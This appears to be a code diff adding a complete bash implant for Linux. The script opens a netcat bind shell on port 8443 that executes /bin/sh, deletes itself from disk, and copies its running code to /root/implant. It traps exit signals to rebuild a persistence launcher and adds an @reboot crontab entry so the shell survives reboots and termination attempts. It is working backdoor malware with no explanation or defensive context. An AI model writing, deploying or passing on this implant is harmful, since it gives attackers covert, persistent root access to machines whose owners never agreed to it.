@@ -1,0 +1,33 @@
+#!/bin/bash
+
+SCRIPT_PID=$$
+PERSIST=/root/persist
+SCRIPT=/root/implant
+COMMAND="nc -nvlp 8443 -e /bin/sh"
+
+function backup_script () {
+cat >> $PERSIST <<EOF
+#!/bin/bash
+$SCRIPT &
+rm -f "$PERSIST"
+crontab -l 2>/dev/null | grep -Fv "@reboot $PERSIST" | crontab -
+EOF
+cat /proc/$SCRIPT_PID/fd/255 > $SCRIPT
+chmod +x $SCRIPT
+chmod +x $PERSIST
+if ! grep -E "@reboot $PERSIST"; then
+	(crontab -l 2>/dev/null; echo "@reboot $PERSIST") | crontab -
+fi
+}
+
+trap backup_script EXIT SIGTERM SIGKILL
+rm -- "$0"
+(${COMMAND} &)&
+if pgrep $(basename $PERSIST); then
+	PERSIST_PID=$(ps -o ppid= $(pgrep $(basename $PERSIST | tr -d " ")))
+	sleep 3
+	kill $PERSIST_PID
+fi
+while true; do
+	sleep 30
+done
